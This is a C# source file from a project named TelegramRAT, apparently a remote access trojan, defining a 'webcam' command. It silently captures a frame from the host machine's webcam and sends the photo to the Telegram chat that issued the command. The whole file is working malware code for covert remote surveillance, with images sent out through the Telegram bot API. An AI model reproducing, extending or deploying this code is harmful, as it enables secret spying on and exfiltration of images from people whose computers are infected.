using Telegram.Bot;
using AForge.Video.DirectShow;
using System.Drawing;
using System.Drawing.Imaging;
using Telegram.Bot.Types;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.Remote;

public class WebcamCommand(ITelegramBotClient botClient, IBotNotificationService notificationService) : AbstractBotCommand
{
    public override string Command => "webcam";
    public override string Description => "Take a photo from webcamera.";
    public override int ArgsCount => 0;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        await Task.Run(async () =>
        {
            try
            {
                FilterInfoCollection captureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (captureDevices.Count == 0)
                {
                    await botClient.SendMessage(model.Message.Chat.Id, "This pc has no webcamera.", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    return;
                }

                using MemoryStream photoStream = new MemoryStream();
                VideoCaptureDevice device = new VideoCaptureDevice(captureDevices[0].MonikerString);
                
                var tcs = new TaskCompletionSource<bool>();

                device.NewFrame += (sender, args) =>
                {
                    using (Bitmap? photoBitmap = args.Frame.Clone() as Bitmap)
                    {
                        if (photoBitmap != null)
                        {
                            photoBitmap.Save(photoStream, ImageFormat.Png);
                        }
                    }
                    device.SignalToStop();
                    tcs.TrySetResult(true);
                };

                device.Start();
                await tcs.Task;
                device.WaitForStop();

                photoStream.Position = 0;
                await botClient.SendPhoto(model.Message.Chat.Id, new InputFileStream(photoStream), replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
            }
            catch (Exception ex)
            {
                await notificationService.ReportExceptionAsync(model.Message, ex);
            }
        });
    }
}
